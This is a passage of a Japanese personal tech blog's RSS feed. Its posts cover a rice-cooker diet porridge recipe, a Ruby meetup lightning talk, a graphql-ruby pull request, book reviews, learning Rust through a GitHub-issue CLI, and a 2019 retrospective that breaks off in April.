&lt;iframe width="560" height="315" frameborder="0" allowfullscreen="" src="//www.youtube.com/embed/NJtgQEXAjNI">&lt;/iframe>
&lt;p>&lt;br>&lt;a href="https://youtube.com/watch?v=NJtgQEXAjNI">究極の減量食「沼」を大公開！&lt;/a>&lt;/p>
&lt;p>沼とは色々なものを十合炊き炊飯器にいれて水分量たっぷりでつくる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%AA%A4%AB%A4%E6">おかゆ&lt;/a>みたいなものである。
マッスルグリルという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Youtube">Youtube&lt;/a>チャンネルで広まった料理。&lt;/p>
&lt;p>必要なものは&lt;/p>
&lt;ul>
&lt;li>鶏肉(ささみ or 胸肉) 754g&lt;/li>
&lt;li>生米 277g&lt;/li>
&lt;li>おくらちゃん 10本&lt;/li>
&lt;li>干し椎茸 おもむろ&lt;/li>
&lt;li>乾燥わかめ おもむろ&lt;/li>
&lt;li>カレー粉 適当&lt;/li>
&lt;li>塩 適当&lt;/li>
&lt;/ul>
&lt;p>だけである。作り方は動画を見てほしい。めちゃめちゃ簡単。
これと卵２個でだいたい2000kcalである。&lt;/p>
&lt;h2>沼のいいところ&lt;/h2>
&lt;h3>簡単&lt;/h3>
&lt;p>材料放り込んで炊飯器のスイッチを押すだけである。
これで明日の朝には一日分の食事が炊飯器の中にある。非常に体験が良い。 &lt;br>
そして沼の材料はいちいち買いに行かなくても&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Amazon">Amazon&lt;/a>で買えるものばかりである。肉、おくら共に冷凍のものがプライムNOWで手に入る。解凍する必要もなく、そのまま炊飯器にほうりこめばOK。その他の材料は普通の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Amazon">Amazon&lt;/a>でも買える。&lt;br>
また全ての材料が保存がきくので、材料を腐らせてしまう一人暮らし自炊あるあるも発生しない。&lt;/p>
&lt;h3>安い&lt;/h3>
&lt;p>一日分あたり鶏肉がだいたい550円、オクラ100円、その他の材料は多めに見積もっても300円分くらいだろう。これで一日分の食事が出来上がる。水をたっぷり入れるので量もかなり多く、4~5回にわけないと食べきれないくらいである。&lt;/p>
&lt;h3>美味い&lt;/h3>
&lt;p>見た目からは想像もできないほど美味しい。干し椎茸とわかめの旨味がたっぷり溶け込んでいる。動画の通りに作ると少し薄めなので塩とカレー粉は多めで良い&lt;/p>
&lt;h3>栄養バランス&lt;/h3>
&lt;p>水をたっぷりいれるので低カロリー。カロリー計算もしやすい。タンパク質もしっかり取れる。&lt;/p>
&lt;h3>可搬性&lt;/h3>
&lt;p>リモートワーク時には役に立たないかもしれない利点だがこれも沼の強み。なにしろただのお粥なのでタッパーに詰め込めば簡単に持ち運べる。盛り付けなど必要なし。後述するが冷めても美味しいので保温したりする必要はない。&lt;/p>
&lt;h2>沼の悪いところ&lt;/h2>
&lt;h3>見た目&lt;/h3>
&lt;p>名は体を表す。&lt;/p>
&lt;h2>沼ワンポイントアド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D0%A5%A4%A5%B9">バイス&lt;/a>
&lt;/h2>
&lt;p>もしこの記事を読んで沼を作ってみようと思った方にアド&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D0%A5%A4%A5%B9">バイス&lt;/a>を残したい。&lt;/p>
&lt;h3>意外と冷めても美味しい&lt;/h3>
&lt;p>保温して放置することで美味しくなる沼だが、冷める過程でも味が入るのかまた一段と美味くなる。筆者は朝になったら保温を切っている。&lt;/p>
&lt;h3>卵のとり方&lt;/h3>
&lt;p>沼だけだと脂肪が足りないので全卵を取ると良い。最初はゆで卵にしていたが、ぶっちゃけ生卵のまま沼に混ぜてしまうのがいちばん簡単なことに気づいたのでおすすめしたい。最近薊さんはオリーブオイル入れているらしい。&lt;/p>
&lt;h3>鶏肉&lt;/h3>
&lt;p>冷凍のささみが一番オススメ。本数で考えれば計量の手間もないし皮を剥がす必要もない。だいたい12本で760g。また冷凍なら肉でも日持ちがするので、「明日は会食の予定があるからを作るはやめておこう」に対応しやすい。&lt;/p>
&lt;h3>炊飯器&lt;/h3>
&lt;p>できれば十合炊きを買った方が良い。五合だと水の量が足りないし成人男性ならば一日分作るのも難しい。
どうしても五合炊きで作りたいならばマッスルグリルのこの動画を参考にするべし。&lt;/p>
&lt;iframe width="560" height="315" frameborder="0" allowfullscreen="" src="//www.youtube.com/embed/yS0AVnwjPy8">&lt;/iframe>
&lt;p>&lt;br>&lt;a href="https://youtube.com/watch?v=yS0AVnwjPy8">【沼】冬の沼！究極のダイエット食！5合炊き版！&lt;/a>&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>筆者は沼生活を二ヶ月ほど続けている。朝飯もしっかり食べるようになって体の調子が良くなった。簡単だし安いし美味いし満腹感もあるのでリモートワークで自炊を始めようと思っている方全員におすすめしたい。&lt;/p>
&lt;/body></description></item><item><title>Ginza.rb#80でLTをしてきた</title><link>https://qwyng.dev/posts/2020/02/19/185934/</link><pubDate>Wed, 19 Feb 2020 18:59:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/02/19/185934/</guid><description>&lt;body>
&lt;h2>　当日の概要&lt;/h2>
&lt;p>Ginza.rb#80でLTをしてきた&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fginzarb.doorkeeper.jp%2Fevents%2F104145" title="Ginza.rb 第80回 はっぴょうかい☆" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://ginzarb.doorkeeper.jp/events/104145">ginzarb.doorkeeper.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>LT&lt;/h2>
&lt;p>イベントの空気感的にはかなりカジュアルよりだったけど、社外でのLTは初めてでガチガチに緊張していた。当日のスライドは以下。&lt;/p>
&lt;p>&lt;iframe id="talk_frame_604811" src="//speakerdeck.com/player/12fd6588fbf84a50837c45687895a92e" width="710" height="399" style="border:0; padding:0; margin:0; background:transparent;" frameborder="0" allowtransparency="true" allowfullscreen="allowfullscreen" mozallowfullscreen="true" webkitallowfullscreen="true">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://speakerdeck.com/qwyng/benefits-of-contributing-to-oss">speakerdeck.com&lt;/a>&lt;/cite>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>へのコントリビュートを一年やってきて思ったところを発表した。koicさんが引用してくれたりyagiさんにいい話きけたといってもらったりして嬉しかったです。&lt;/p>
&lt;p>他の人の発表も、「2.7からのパターンマッチは実は右辺代入だった！？」とか「同じシステムってなんだ？」とか「rubocop-minitestのリアル&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BF%A5%A4%A5%E0%A5%EA%A5%EA%A1%BC%A5%B9">タイムリリース&lt;/a>」とか「自分の一年間やってきたこと」とか「&lt;code>fill_in&lt;/code>がモーダル開閉のfocus()でうまく機能しなくなる」とか「Kaigi on RailｓはRubyKaigiと初心者向けの中間くらいの難易度で開催したい」とか色々な話題のLTがあって面白かった。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>Ginza.rb、毎回willnetさんやy-yagiさんのためになる話がきけるので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>好きの人にはオススメの勉強会。&lt;/p>
&lt;/body></description></item><item><title>graphql-rubyにコミットした</title><link>https://qwyng.dev/posts/2020/02/16/160013/</link><pubDate>Sun, 16 Feb 2020 16:00:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/02/16/160013/</guid><description>&lt;body>
&lt;p>業務でgraphql-&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>を色々いじってたら「おや？」と思う挙動があった。調べてみると同じ内容でissueを立てている人がいた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frmosolgo%2Fgraphql-ruby%2Fissues%2F2544" title="`loads:` doesn't work for field arguments · Issue #2544 · rmosolgo/graphql-ruby" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/rmosolgo/graphql-ruby/issues/2544">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>graphql-&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>では_idといった引数を受け取った時にloadsオプションを指定していると&lt;code>HogeSchema.object_from_id&lt;/code>を呼んでレコードを取り出す動作を簡潔に書くことができる。
だけど実はこれはinput_object(いくつかの引数の型をまとめて定義したもの）として定義しないと使えなかった。（Mutaionでも引数につかえるのだけれどMutationの引数は実質input_objectの定義なので同じ。）&lt;/p>
&lt;p>&lt;a href="https://sasa5740.hatenablog.com/entry/2019/09/28/194415?_ga=2.174169826.1113101934.1581826694-1987314295.1580477225">前回graphql-rubyをふんわり読んで&lt;/a>色々脳内地図があり、issue内でもオーナーのrmosolgo氏が修正することに前向きそうだったのでPRを出した。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frmosolgo%2Fgraphql-ruby%2Fpull%2F2720" title="loads: with plain field arguments by QWYNG · Pull Request #2720 · rmosolgo/graphql-ruby" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/rmosolgo/graphql-ruby/pull/2720">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p> 内容はinput_type内の処理をそのままfiledの引数の処理に持ってきたのと、内部で使っている&lt;code>load_application_object&lt;/code>が呼び出し元の&lt;code>@context&lt;/code>のリーダーメソッドに依存していたので外部から注入できるように変更したというもの。&lt;/p>
&lt;p>rmosolgo氏が色々レビューをしてくれてありがたかった。（最後に氏みずからinput_object内の処理も少し書き換えるコミットを積んでくれた。不要にlodasに対して実行されていたコードが減ったので、PRの主目的以外の恩恵もあると思う）&lt;/p>
&lt;p>GraphQLは仕事で使い始めたばかりだけれどテストコードやらみると色々勉強になって良い。&lt;/p>
&lt;/body></description></item><item><title>みんなのコンピューターサイエンスとプログラマの数学を読んだ</title><link>https://qwyng.dev/posts/2020/01/22/213140/</link><pubDate>Wed, 22 Jan 2020 21:31:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/01/22/213140/</guid><description>&lt;body>
&lt;p>最近以下の二冊を読んだ&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B07KXP79Y9/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/41PTNhAHzEL._SL160_.jpg" class="hatena-asin-detail-image" alt="みんなのコンピュータサイエンス" title="みんなのコンピュータサイエンス">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/B07KXP79Y9/hatena-blog-22/">みんなのコンピュータサイエンス&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/Wladston%20Ferreira%20Filho" class="keyword">Wladston Ferreira Filho&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%E6%C6%B1%CB%BC%D2">翔泳社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2019/01/15&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Kindle">Kindle&lt;/a>版&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4797395451/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51JY0QLFuEL._SL160_.jpg" class="hatena-asin-detail-image" alt="プログラマの数学第2版" title="プログラマの数学第2版">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4797395451/hatena-blog-22/">プログラマの数学第2版&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/%B7%EB%BE%EB%20%B9%C0" class="keyword">結城 浩&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/SB%A5%AF%A5%EA%A5%A8%A5%A4%A5%C6%A5%A3%A5%D6">SBクリエイティブ&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2018/01/17&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;p>数学、コンピューターサイエンスに関する本を読んだ。&lt;/p>
&lt;h3>本を読んだ理由&lt;/h3>
&lt;p>僕は文系卒であり、新卒で入った組織もソフトウェアエンジニアリングとはあまり関係ない場所だった。&lt;br>
自分がコンピューターサイエンスの基礎がわかっているとは思えないし、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>をものにしているとも思えない。実際&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AtCoder">AtCoder&lt;/a>にはちょくちょくでているものの未だレートはこんな感じ。大体ABCのCまでなんとか解いてDには歯が立たない感じだ。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200122/20200122203533.png" alt="f:id:sasa5740:20200122203533p:plain" title="f:id:sasa5740:20200122203533p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;p>だいたい良い&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DE%A1%BC">プログラマー&lt;/a>とは？みたいな記事をみるとコンピューターサイエンスを学ぼう、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を学ぼうと書いてある。&lt;br>
Matzもいってるので多分正しいのだと思う。&lt;del>誰がいっているのかで判断するのは良くない&lt;/del>
海外の企業も採用時にはまず&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>についてしっかり確認する印象がある。&lt;br>
そういった記事を読んでとても不安になり本に助けを求めた。&lt;/p>
&lt;h3>なんにもわからない&lt;/h3>
&lt;p>論理、確率、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%A2%C7%BC%CB%A1">帰納法&lt;/a>、動的計画、データ構造は、説明できるほど理解できる時が来るのだろうか、競プロをやっていけば（周りよりスピードはゆっくりだろうけど）ついていくのだろうか。
「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2">再帰&lt;/a>はスタックに構造をいれていく」とか「５つのユニークな要素から３つ取り出す順列は5 * 4 * 3で60通りあるとか、順序を考えないと順序考えた分を割って5 * 4 * 3 / 3 * 2 * 1で10通り」とか読んでなんとなく意味はわかっても日本語が少し変わって問題を少しひねられたらなにもできない気がする。&lt;br>
根本は難しいことをできるだけ細分化して考えるということだと思う。しかし与えられた問題に適切な&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0">アルゴリズム&lt;/a>を出す自信が全く無い。一歩ずつ頑張るしかないのだろう。&lt;/p>
&lt;h3>その他&lt;/h3>
&lt;p>「コンピューターサイエンス」と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%BE%C1%DB%A5%E1%A5%E2%A5%EA">仮想メモリ&lt;/a>とか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF">レジスタ&lt;/a>、スレッド、プロセス、I/O、(メモリの方の）ヒープ、(スレッド毎の）スタック、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB">カーネル&lt;/a>、ソケットといった（多分）&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>からつらなる概念は別扱いなのだろうか？
この他にもHTTPだったり&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/RDBMS">RDBMS&lt;/a>だったりなんにもわからんなと思った2020年1月22日だった。&lt;/p>
&lt;/body></description></item><item><title>RustでGithubのissueひっぱてくるCLIアプリを書いた</title><link>https://qwyng.dev/posts/2020/01/15/170801/</link><pubDate>Wed, 15 Jan 2020 17:08:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/01/15/170801/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>、Elixirときて完全に別軸の静的型付け低級言語としてRustで遊んでいる。&lt;br>
お正月に泣きながらRustの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9">コンパイラ&lt;/a>といろいろしてた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fgithub-issue" title="QWYNG/github-issue" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/github-issue">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>ユーザー名とレポジトリ名を下のように渡すと&lt;br>
&lt;code>github-issue rails rails&lt;/code>　　&lt;/p>
&lt;pre class="code" data-lang="" data-unlink> number |title |created_at |
38237 |Update caching_with_rails.md |2020-01-15T02:29:53Z |
38235 |Move advisory lock to it's own connection |2020-01-14T17:54:27Z |
38234 |Rails 6 : config.require_master_key=true doesn't raise an error if key does not exist |2020-01-14T15:49:12Z |
38229 |Prevent `has_one` `build_association` from `touch` parent record if the record isn't committed |2020-01-13T22:11:50Z |
38226 |Active Record unit tests fail with MySQL 8.0.19 |2020-01-13T14:59:02Z |
&lt;/pre>
&lt;p>という感じで標準出力するアプリを書いた。プログラミングElixirの題材をRustで書き直したやつ。まだまだテストでのモックとかやるべきことはいっぱいある。&lt;/p>
&lt;h3>Rustつまづきポイント&lt;/h3>
&lt;p>そもそも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9">コンパイラ&lt;/a>になんとか通してもらうために無理した書き方をしている自覚があり、しかもきれいにする方法がわからないので書くたびに自分の無力感が高まって泣いていた。&lt;/p>
&lt;h4>文字列型の種類が複数&lt;/h4>
&lt;p>Rustでのいわゆる文字列には、メモリ長が決定されている組み込みの&lt;code>&amp;amp;str&lt;/code>と、メモリ長が固定されていない標準ライブラリにある&lt;code>String&lt;/code>型がある。&lt;code>String&lt;/code>型はヒープ（スレッド間で共有できるメモリ領域）に格納できて可変。 実際にコード内で
&lt;code>"string"&lt;/code>のように書くと&amp;amp;str型になるので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Github">Github&lt;/a>からのレスポンスをStringとして扱う時に色々変換しなくてはならず辛かった。多分もっといいやり方があると思うので助けて。&lt;/p>
&lt;h4>Result型とOption型&lt;/h4>
&lt;p>つまづきポイントに入れてるけど同時にRustの優れてるポイント。多くの関数がこの2つのうちどちらかを返すことが多い。&lt;br>
OptionはNoneもしくは値を返すという型。 Noneはnullのようなもの。 返り値書くときには&lt;code>Some(1)&lt;/code>や&lt;code>None&lt;/code>という書き方をする。&lt;/p>
&lt;p>Resultは例えば&lt;code>run&lt;/code>みたいな関数があったとして&lt;br>
&lt;code>pub fn run(args: Vec&amp;lt;String&amp;gt;) -&amp;gt; Result&amp;lt;i32, Box&amp;lt;dyn Error&amp;gt;&amp;gt;&lt;/code>&lt;br>
ようにエラーを返すかもしれないことを明記できる型。&lt;br>
返り値書くときには&lt;code>Ok(1)&lt;/code>や&lt;code>Err(ParseError)&lt;/code>という書き方をする。&lt;br>
これらの型で返された値は&lt;code>unwrap()&lt;/code>をするか
&lt;code>process(args)?&lt;/code>のように末尾に&lt;code>?&lt;/code>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B1%E9%BB%BB%BB%D2">演算子&lt;/a>をつけて例外やNoneが出たら関数全体としてエラーやNoneを返すということを明示することができる。しかしどんな形がベストなのかイマイチつかめない。ここではめったにエラー起きないだろうってところは&lt;code>unwrap()&lt;/code>でそれ以外は&lt;code>?&lt;/code>という感じで使えばいいのだろうか。&lt;br>
ちなみにNoneやErr()に対して&lt;code>unwrap()&lt;/code>するとpanicする。&lt;code>unwrap_or_else()&lt;/code>なんかもあるのでやりようはありそう。&lt;/p>
&lt;h4>所有権&lt;/h4>
&lt;p>もう全然スマートな解決方法がわからない。無理やり&lt;code>clone()&lt;/code>したりして逃れている。&lt;br>
&lt;code>rows.as_array().unwrap().to_owned()&lt;/code>&lt;br>
こんなコードも書きながらもっといいやり方ないのかと泣いていた。&lt;/p>
&lt;h3>Rustのよかったところ&lt;/h3>
&lt;p>よかったところというとおこがましいという気持ちになるくらいには使いこなせてないんだけど書く&lt;/p>
&lt;h4>パターンマッチ&lt;/h4>
&lt;p>最高of最高&lt;/p>
&lt;h4>Result型&lt;/h4>
&lt;p>コードを読む側、使う側としてResult型はとても便利。エラーを?でキャッチできるしこの関数にエラー処理が任されているんだなというのがひと目で分かる。 そもそも型というものがコールドリーディング時に便利。&lt;br>
たぶんOptionとResultは慣れると余計なエラーやNullの処理挟まなくて良くなるので便利そう。&lt;/p>
&lt;h4>ク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%ED%A5%B9%A5%B3%A5%F3">ロスコン&lt;/a>パイル&lt;/h4>
&lt;p>最終的に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%A1%B3%A3%B8%EC">機械語&lt;/a>になって人に配布できるというのが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>から入るとかなり画期的に感じる。 一応このアプリもタグ付けしたらGithubActionで複数OSでバイナリをビルドしてzipにしてリリースするということができた。（&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/linux">linux&lt;/a>環境だと何故かOpenSSLがないと言われてリリースビルドが通らない。libssl-devを直接入れても再現するので困ってる）&lt;/p>
&lt;h4>cargo&lt;/h4>
&lt;p>Elixirのmixと同じで、ライブラリやテストが言語に組み込まれているのもモダンな言語感があってよかった。リンターもしっかり搭載。&lt;/p>
&lt;h4>ビルド通ったときの安心感&lt;/h4>
&lt;p>僕はCとかの低級言語はなにも触った事ない。けれどよく未定義動作の処理に困る話は聞く。その中でRustで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9">コンパイラ&lt;/a>通るということはメモリを贅沢につかってこそすれ危険に利用してないことなので安心感がある。&lt;/p>
&lt;h4>俺は今Rustというかっこいい言語で開発しているという謎の興奮&lt;/h4>
&lt;p>これが9割&lt;/p>
&lt;h3>まとめ&lt;/h3>
&lt;p>Rust本当になにもわからん。でも実践Rust入門は良書です。&lt;/p>
&lt;/body></description></item><item><title>2019年を振り返る</title><link>https://qwyng.dev/posts/2019/12/30/213408/</link><pubDate>Mon, 30 Dec 2019 21:34:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/12/30/213408/</guid><description>&lt;body>
&lt;p>はじめてのふりかえり&lt;/p>
&lt;h2>1月&lt;/h2>
&lt;ul>
&lt;li>エンジニアとして働いてなかった。2月に転職することがわかってたのでソワソワしていた気がする。新卒から一年と十ヶ月の短い期間だったけど迷惑かけまくったなぁと反省しています。&lt;/li>
&lt;li>東京に引っ越した。&lt;/li>
&lt;li>有給消化中に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>にはじめてコミットした。嬉しくて書いた記事が思ったより反響があり、別記事内で言及してくれる人もいて嬉しかった。同時にQiitaの拡散力怖いと思ったのでメインはブログにしようと思った。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fqiita.com%2FQWYNG%2Fitems%2Fafbca5261f2f770995d2" title="OSSコントリビュートに挑戦してみた話 - Qiita" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://qiita.com/QWYNG/items/afbca5261f2f770995d2">qiita.com&lt;/a>&lt;/cite>
&lt;/li>
&lt;/ul>
&lt;h2>2月&lt;/h2>
&lt;ul>
&lt;li>業務委託として今の社で勤務を始めた。出社時間が自由すぎてカルチャーショックだったのは覚えている。自分のかいたコードがチームの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EA%A5%DD%A5%B8%A5%C8%A5%EA">リポジトリ&lt;/a>のmasterにマージされた時の感動は忘れられない。&lt;/li>
&lt;li>読んだ本の中だとこれが印象に残っている。
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F02%2F11%2F184124" title="情熱プログラマーを読んで - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/02/11/184124?_ga=2.179186020.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>
&lt;/li>
&lt;/ul>
&lt;h2>3月&lt;/h2>
&lt;ul>
&lt;li>業務で一つリリースがあった。といっても僕はアプリケーションのコードを書いただけなのだが。&lt;/li>
&lt;li>初めてエンジニアとして稼いだお金が口座に入った。こんなんでもらってええんかという気持ちになった。&lt;/li>
&lt;li>この頃から読んだ本をアウトプットしようと思って色々やった。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F03%2F18%2F231417" title="「失敗から学ぶRDBの正しい歩き方」を読んで - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/03/18/231417?_ga=2.11865588.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F04%2F08%2F003824" title="「オブジェクト指向設計実践ガイド　～Rubyでわかる 進化しつづける柔軟なアプリケーションの育て方」を読みました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/04/08/003824?_ga=2.175030754.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;ul>
&lt;li>Ruby2.7で追加されるパターンマッチに関してブログを書いたら実装した人から反応をもらえた。ブログ書くモチベの源泉となる体験だった。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F05%2F23%2F005144" title="SpotifyAPIとRuby2.7の新機能パターンマッチングで人気のある曲だけをフリーワードから検索して出力するスクリプトを書いた - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/05/23/005144?_ga=2.4178544.1182737160.1577696184-1938314347.1562511586">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>4月&lt;/h2>
&lt;ul>
&lt;li>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B4%F0%CB%DC%BE%F0%CA%F3%B5%BB%BD%D1%BC%D4%BB%EE%B8%B3">基本情報技術者試験&lt;/a>を受けた。この頃はポート番号と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/IP%A5%A2%A5%C9%A5%EC%A5%B9">IPアドレス&lt;/a>の区別もふんわり状態だったので勉強になった。合格証書が思ったよりしっかりしていて良かった。&lt;/li>
